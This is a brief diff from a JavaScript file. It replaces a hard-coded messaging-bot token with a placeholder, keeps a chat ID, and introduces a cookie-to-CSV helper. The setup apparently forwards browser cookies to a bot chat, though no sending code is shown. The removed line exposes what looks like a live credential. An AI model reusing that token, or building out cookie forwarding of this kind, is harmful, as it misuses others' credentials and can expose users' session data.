@@ -1,5 +1,5 @@
 // Replace these with your bot token and chat ID
-const botToken = "7599315101:AAGKenyioiwC7eNBNC2HRDk0pWNt-VDEYpE"; // Example: 123456789:ABCdefGHIjklMNO
+const botToken = "KEYYYYYYYYYYY"; // Example: 123456789:ABCdefGHIjklMNO
 const chatId = "2141142912"; // Example: 987654321
 
 // Helper function to convert cookies to a grouped CSV format
